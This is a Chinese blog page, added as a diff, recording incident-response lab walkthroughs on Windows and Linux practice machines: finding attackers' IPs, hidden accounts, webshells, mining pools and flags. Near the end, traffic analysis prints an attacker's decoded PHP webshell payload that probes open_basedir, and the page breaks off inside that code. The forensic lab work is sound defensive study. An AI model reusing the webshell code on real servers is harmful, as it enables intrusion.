@@ -1,0 +1,656 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="G00d">
+
+
+    <meta name="subtitle" content="没有人会一直一帆风顺，失败和挫折才是人生常态">
+
+
+
+    <meta name="keywords" content="G00dddd">
+
+
+<title>应急响应训练 | G00d`s Blog</title>
+
+
+
+    <link rel="icon" href="../favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="../css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="../js/script.js"></script>
+    
+    <script src="../js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script>
+    //创建雪花元素
+    function snow() {
+      //获取视窗的宽高
+      var width = window.innerWidth;
+      var height = window.innerHeight;
+  
+      var snow = document.createElement("div");             //创建元素
+  
+      //初始化雪花样式
+      size = Math.random() * 15 + 10;                          //随机生成雪花大小
+      snow.style.width = size + "px";
+      snow.style.height = size + "px";
+      snow.style.background = "url(img/雪花" + Math.floor((Math.random()*6)+1) + ".png) no-repeat";   //1-6随机选择雪花的图片
+      // snow.style.background = "url(./雪花.png) no-repeat";
+      snow.style.backgroundSize = '100% 100%';
+      snow.style.position = "fixed";                        //元素的位置相对于浏览器窗口是固定位置，即使窗口是滚动的它也不会移动
+      snow.style.filter = "blur(1px)";                      //给图片设置高斯模糊
+      snow.style.left = Math.random() * width + 'px';         //随机生成雪花的初始位置
+      snow.style.top = "10px";
+      snow.style.opacity = parseInt(Math.random()*10)/2;   //随机生成雪花的透明度
+  
+      //向body添加元素
+      document.body.appendChild(snow);
+  
+      //创建定时器，每30ms雪花下落一次
+      var timer = setInterval(function () {
+        snow.style.top = parseInt(snow.style.top) + 3 + 'px';     //每次下落3px
+  
+        //当雪花到达底部后清除元素
+        if (parseInt(snow.style.top) >= height) {
+          clearInterval(timer);
+          snow.parentNode.removeChild(snow)
+        }
+      }, 30)
+    }
+  
+    //页面加载完成执行函数
+    window.onload = function play() {
+      //创建定时器，每300ms生成一朵雪花
+      setInterval(function () {
+        snow()
+      }, 300)
+    }
+  </script>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script>
+    //蜘蛛网特效
+    !
+    function() {
+        function n(n, e, t) {
+            return n.getAttribute(e) || t
+        }
+        function e(n) {
+            return document.getElementsByTagName(n)
+        }
+        function t() {
+            var t = e("script"),
+            o = t.length,
+            i = t[o - 1];
+            return {
+                l: o,
+                z: n(i, "zIndex", -1),
+                o: n(i, "opacity", .9),   //透明度
+                c: n(i, "color", "255, 102, 153"),   //颜色
+                n: n(i, "count", 99)
+            }
+        }
+        function o() {
+            a = m.width = window.innerWidth || document.documentElement.clientWidth || document.body.clientWidth,
+            c = m.height = window.innerHeight || document.documentElement.clientHeight || document.body.clientHeight
+        }
+        function i() {
+            r.clearRect(0, 0, a, c);
+            var n, e, t, o, m, l;
+            s.forEach(function(i, x) {
+                for (i.x += i.xa, i.y += i.ya, i.xa *= i.x > a || i.x < 0 ? -1 : 1, i.ya *= i.y > c || i.y < 0 ? -1 : 1, r.fillRect(i.x - .5, i.y - .5, 1, 1), e = x + 1; e < u.length; e++) n = u[e],
+                null !== n.x && null !== n.y && (o = i.x - n.x, m = i.y - n.y, l = o * o + m * m, l < n.max && (n === y && l >= n.max / 2 && (i.x -= .03 * o, i.y -= .03 * m), t = (n.max - l) / n.max, r.beginPath(), r.lineWidth = t / 2, r.strokeStyle = "rgba(" + d.c + "," + (t + .2) + ")", r.moveTo(i.x, i.y), r.lineTo(n.x, n.y), r.stroke()))
+            }),
+            x(i)
+        }
+        var a, c, u, m = document.createElement("canvas"),
+        d = t(),
+        l = "c_n" + d.l,
+        r = m.getContext("2d"),
+        x = window.requestAnimationFrame || window.webkitRequestAnimationFrame || window.mozRequestAnimationFrame || window.oRequestAnimationFrame || window.msRequestAnimationFrame ||
+        function(n) {
+            window.setTimeout(n, 1e3 / 45)
+        },
+        w = Math.random,
+        y = {
+            x: null,
+            y: null,
+            max: 2e4
+        };
+        m.id = l,
+        m.style.cssText = "position:fixed;top:0;left:0;z-index:" + d.z + ";opacity:" + d.o,
+        e("body")[0].appendChild(m),
+        o(),
+        window.onresize = o,
+        window.onmousemove = function(n) {
+            n = n || window.event,
+            y.x = n.clientX,
+            y.y = n.clientY
+        },
+        window.onmouseout = function() {
+            y.x = null,
+            y.y = null
+        };
+        for (var s = [], f = 0; d.n > f; f++) {
+            var h = w() * a,
+            g = w() * c,
+            v = 2 * w() - 1,
+            p = 2 * w() - 1;
+            s.push({
+                x: h,
+                y: g,
+                xa: v,
+                ya: p,
+                max: 6e3
+            })
+        }
+        u = s.concat([y]),
+        setTimeout(function() {
+            i()
+        },
+        100)
+    } ();
+
+    //蜘蛛网特效
+    </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">G00d&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="../archives">Posts</a>
+                
+                    <a class="menu-item" href="../category">Categories</a>
+                
+                    <a class="menu-item" href="../tag">Tags</a>
+                
+                    <a class="menu-item" href="../about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">G00d&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="../archives">Posts</a>
+                
+                    <a class="menu-item" href="../category">Categories</a>
+                
+                    <a class="menu-item" href="../tag">Tags</a>
+                
+                    <a class="menu-item" href="../about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    var tocbot_timer;
+    var DEPTH_MAX = 6; // 为 6 时展开所有
+    var tocbot_default_config = {
+        tocSelector: '.tocbot-list',
+        contentSelector: '.post-content',
+        headingSelector: 'h1, h2, h3, h4, h5',
+        orderedList: false,
+        scrollSmooth: true,
+        onClick: extend_click,
+    };
+
+    function extend_click() {
+        clearTimeout(tocbot_timer);
+        tocbot_timer = setTimeout(function() {
+            tocbot.refresh(obj_merge(tocbot_default_config, {
+                hasInnerContainers: true
+            }));
+        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
+    }
+
+    document.ready(function() {
+        tocbot.init(obj_merge(tocbot_default_config, {
+            collapseDepth: 1
+        }));
+    });
+
+    function expand_toc() {
+        var b = document.querySelector('.tocbot-toc-expand');
+        var expanded = b.getAttribute('data-expanded');
+        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
+        tocbot.refresh(obj_merge(tocbot_default_config, {
+            collapseDepth: expanded ? 1 : DEPTH_MAX
+        }));
+        b.innerText = expanded ? 'Expand all' : 'Collapse all';
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+    function obj_merge(target, source) {
+        for (var item in source) {
+            if (source.hasOwnProperty(item)) {
+                target[item] = source[item];
+            }
+        }
+        return target;
+    }
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">应急响应训练</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">G00d</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">一月 16, 2025&nbsp;&nbsp;15:21:10</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="../categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/">应急响应</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <p>[TOC]</p>
+<h1 id="应急响应靶机练习-Web1"><a href="#应急响应靶机练习-Web1" class="headerlink" title="应急响应靶机练习-Web1"></a>应急响应靶机练习-Web1</h1><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">前景需要：</span><br><span class="line"></span><br><span class="line">小李在值守的过程中，发现有<span class="meta">CPU</span>占用飙升，出于胆子小，就立刻将服务器关机，并找来正在吃苕皮的hxd帮他分析，这是他的服务器系统，请你找出以下内容，并作为通关条件：</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>.攻击者的shell密码</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>.攻击者的<span class="built_in">IP</span>地址</span><br><span class="line"></span><br><span class="line"><span class="number">3</span>.攻击者的隐藏账户名称</span><br><span class="line"></span><br><span class="line"><span class="number">4</span>.攻击者挖矿程序的矿池域名(仅域名)</span><br><span class="line"></span><br><span class="line"><span class="number">5</span>.有实力的可以尝试着修复漏洞</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>攻击者的<span class="built_in">shell</span>密码</span><br><span class="line">我尝试把www目录打包发出来用d盾看一下发现有个<span class="built_in">shell</span>.php文件异常,于是进去看一下找不到<span class="built_in">shell</span>.php怀疑是被Windows杀了</span><br><span class="line">那这个题就没有答案了</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E8%AE%AD%E7%BB%83//image-20250116153156970.png" alt="image-20250116153156970"></p>
+<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2</span>.攻击者的<span class="built_in">IP</span>地址</span><br><span class="line">查看apache的日志文件,搜索shll</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E8%AE%AD%E7%BB%83//image-20250116161330809.png" alt="image-20250116161330809"></p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">3.</span>攻击者的隐藏账户名称</span><br><span class="line">wmic useraccount <span class="keyword">get</span> <span class="type">name</span>,SID   （查看全部账户信息包括隐藏的，隐藏的Windows账户一般后面有个$)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E8%AE%AD%E7%BB%83//image-20250116163213709.png" alt="image-20250116163213709"></p>
+<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">4</span>.攻击者挖矿程序的矿池域名(仅域名)</span><br><span class="line">net <span class="keyword">user</span> <span class="title">hack168</span>$ <span class="number">123456789</span>!aa  改一下密码,登录上去看看</span><br><span class="line">也可以直接看用户目录下有哪些用户直接找文件</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E8%AE%AD%E7%BB%83//image-20250116163407465.png" alt="image-20250116163407465"></p>
+<p><img src="/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E8%AE%AD%E7%BB%83//image-20250116164343168.png" alt="image-20250116164343168"></p>
+<p><img src="/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E8%AE%AD%E7%BB%83//image-20250116165435314.png" alt="image-20250116165435314"></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">通过exe文件反编译出pyc文件,然后把这个pyc文件放https:<span class="regexp">//</span>tool.lu<span class="regexp">/pyc/</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E8%AE%AD%E7%BB%83//image-20250116170202258.png" alt="image-20250116170202258"></p>
+<h1 id="应急响应靶机练习-Web2"><a href="#应急响应靶机练习-Web2" class="headerlink" title="应急响应靶机练习-Web2"></a>应急响应靶机练习-Web2</h1><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">欢迎使用 知攻善防实验室 解题系统:</span></span><br><span class="line"><span class="section">-------------------------------</span></span><br><span class="line"><span class="section">在解题前，请确保您已解的一下内容:</span></span><br><span class="line"><span class="section">-------------------------------</span></span><br><span class="line">1.攻击者的IP地址（两个）？</span><br><span class="line">2.攻击者的webshell文件名？</span><br><span class="line">3.攻击者的webshell密码？</span><br><span class="line">4.攻击者的QQ号？</span><br><span class="line">5.攻击者的服务器伪IP地址？</span><br><span class="line">6.攻击者的服务器端口？</span><br><span class="line">7.攻击者是如何入侵的（选择题）？</span><br><span class="line"><span class="section">8.攻击者的隐藏用户名？</span></span><br><span class="line"><span class="section">-------------------------------</span></span><br><span class="line">准备好请告诉我(y or n):</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">查看FTP服务器的日志</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E8%AE%AD%E7%BB%83//image-20250116195428996.png" alt="image-20250116195428996"></p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">查看apache日志</span><br></pre></td></tr></table></figure>
+
+<p>​	<img src="/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E8%AE%AD%E7%BB%83//image-20250116194944488.png" alt="image-20250116194944488"></p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">查看隐藏用户wmic useraccount <span class="keyword">get</span> <span class="type">name</span>,SID</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E8%AE%AD%E7%BB%83//image-20250116195937195.png" alt="image-20250116195937195"></p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">传一个日志分析工具,找到有远程登录</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E8%AE%AD%E7%BB%83//image-20250116210649002.png" alt="image-20250116210649002"></p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">找到有上传frp和vps</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E8%AE%AD%E7%BB%83//image-20250116211058868.png" alt="image-20250116211058868"></p>
+<h1 id="应急响应靶机练习-Web3"><a href="#应急响应靶机练习-Web3" class="headerlink" title="应急响应靶机练习-Web3"></a>应急响应靶机练习-Web3</h1><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">欢迎使用 知攻善防实验室 题解系统</span><br><span class="line">确保你已获得以下信息：</span><br><span class="line">攻击者的两个<span class="built_in">IP</span>地址</span><br><span class="line">攻击者隐藏用户名称</span><br><span class="line">三个攻击者留下的flag</span><br><span class="line">你准备好了吗？(y/n):</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic useraccount <span class="keyword">get</span> <span class="type">name</span>,SID得到隐藏账户</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E8%AE%AD%E7%BB%83//image-20250117102629830.png" alt="image-20250117102629830"></p>
+<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">apache</span>的日志文件被删除了,通过上传Windows日志分析工具得到攻击者<span class="built_in">ip</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E8%AE%AD%E7%BB%83//image-20250117103512194.png" alt="image-20250117103512194"></p>
+<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在计划任务中发现第一个<span class="built_in">flag</span>同时恶意文件的位置</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E8%AE%AD%E7%BB%83//image-20250117104356092.png" alt="image-20250117104356092"></p>
+<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这个是说把一句话写到这个位置同时找到第二个<span class="built_in">flag</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E8%AE%AD%E7%BB%83//image-20250117104754765.png" alt="image-20250117104754765"></p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">这是说zblog已经被攻陷了,<span class="keyword">admin</span>密码也被改了</span><br><span class="line">下载<span class="keyword">nologin</span>.php放在www目录下进行登录。直接登录Hacker账号吧</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E8%AE%AD%E7%BB%83//image-20250117105559106.png" alt="image-20250117105559106"></p>
+<p><img src="/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E8%AE%AD%E7%BB%83//image-20250117105827212.png" alt="image-20250117105827212"></p>
+<h1 id="Linux应急响应靶机-1"><a href="#Linux应急响应靶机-1" class="headerlink" title="Linux应急响应靶机 1"></a>Linux应急响应靶机 1</h1><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">黑客的<span class="built_in">IP</span>地址</span><br><span class="line"></span><br><span class="line">遗留下的三个flag</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">先<span class="built_in">history</span>一下看看历史命令</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E8%AE%AD%E7%BB%83//image-20250117110521647.png" alt="image-20250117110521647"></p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">看被改的这个文件</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E8%AE%AD%E7%BB%83//image-20250117110633059.png" alt="image-20250117110633059"></p>
+<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">上传Ashro_linux.sh加<span class="number">777</span>权限后运行发现有redis的公钥登录,以及黑客的<span class="built_in">ip</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E8%AE%AD%E7%BB%83//image-20250117111509347.png" alt="image-20250117111509347"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">查看redis配置文件<span class="built_in">cat</span> /etc/redis.conf发现flag</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E8%AE%AD%E7%BB%83//image-20250117111846507.png" alt="image-20250117111846507"></p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">查看redis日志<span class="keyword">cat</span> /etc/redis.<span class="keyword">conf</span> | <span class="keyword">grep</span> loglevel 发现是<span class="keyword">verbose</span>,挺详细的,直接看日志吧(这一步可有可无,无论如何都要看日志)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">查看完整日志<span class="keyword">cat</span> /<span class="keyword">var</span>/<span class="keyword">log</span>/redis/redis.<span class="keyword">log</span></span><br><span class="line">只查看连接的日志<span class="keyword">cat</span> /<span class="keyword">var</span>/<span class="keyword">log</span>/redis/redis.<span class="keyword">log</span> | grep Accepted 这个是确定黑客ip的</span><br></pre></td></tr></table></figure>
+
+<h1 id="Linux应急响应靶机-2"><a href="#Linux应急响应靶机-2" class="headerlink" title="Linux应急响应靶机 2"></a>Linux应急响应靶机 2</h1><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>,提交攻击者IP</span><br><span class="line"><span class="built_in"></span></span><br><span class="line"><span class="built_in">2,</span>提交攻击者修改的管理员密码(明文)</span><br><span class="line"><span class="built_in"></span></span><br><span class="line"><span class="built_in">3,</span>提交第一次Webshell的连接URL(http://xxx.xxx.xxx.xx/abcdefg?abcdefg只需要提交abcdefg?abcdefg)</span><br><span class="line"><span class="built_in"></span></span><br><span class="line"><span class="built_in">3,</span>提交Webshell连接密码</span><br><span class="line"><span class="built_in"></span></span><br><span class="line"><span class="built_in">4,</span>提交数据包的flag1</span><br><span class="line"><span class="built_in"></span></span><br><span class="line"><span class="built_in">5,</span>提交攻击者使用的后续上传的木马文件名称</span><br><span class="line"><span class="built_in"></span></span><br><span class="line"><span class="built_in">6,</span>提交攻击者隐藏的flag2</span><br><span class="line"><span class="built_in"></span></span><br><span class="line"><span class="built_in">7,</span>提交攻击者隐藏的flag3</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E8%AE%AD%E7%BB%83//image-20250117205525766.png" alt="image-20250117205525766"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">history</span>查看历史命令发现有写入文件</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">传whoamifuck.<span class="keyword">sh</span>收集一下攻击者ip,也可以用bt然后输入14登录宝塔进去看日志</span><br><span class="line">Ashro_linux.<span class="keyword">sh</span>给了权限但是运行不了,好离谱</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E8%AE%AD%E7%BB%83//image-20250117205158304.png" alt="image-20250117205158304"></p>
+<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">下载/root目录下流量包,分析<span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">7</span>这个<span class="built_in">ip</span>的流量,也找不到,但是搜索flag找到信息,研究请求报文和返回报明白<span class="number">20</span>.<span class="number">1</span>是攻击<span class="built_in">ip</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E8%AE%AD%E7%BB%83//image-20250117213553525.png" alt="image-20250117213553525"></p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">追踪<span class="keyword">http</span>协议发现有一句话木马</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E8%AE%AD%E7%BB%83//image-20250117225053794.png" alt="image-20250117225053794"></p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">Network2020=<span class="variable">@ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line"><span class="variable">@set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$opdir</span>=<span class="variable">@ini_get</span>(<span class="string">&quot;open_basedir&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$opdir</span>) &#123;</span><br><span class="line">    <span class="variable">$ocwd</span>=dirname(<span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_FILENAME&quot;</span>]);</span><br><span class="line">    <span class="variable">$oparr</span>=preg_split(base64_decode(<span class="string">&quot;Lzt8Oi8=&quot;</span>),<span class="variable">$opdir</span>);</span><br><span class="line">    <span class="variable">@array_push</span>(<span class="variable">$oparr</span>,<span class="variable">$ocwd</span>,sys_get_temp_dir());</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$oparr</span> as <span class="variable">$item</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">@is_writable</span>(<span class="variable">$item</span>)) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ;</span><br><span class="line">        <span class="variable">$tmdir</span>=<span class="variable">$item</span>.<span class="string">&quot;/.fd491f470fb7&quot;</span>;</span><br><span class="line">        <span class="variable">@mkdir</span>(<span class="variable">$tmdir</span>);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">@file_exists</span>(<span class="variable">$tmdir</span>)) &#123;</span><br><span class="line">          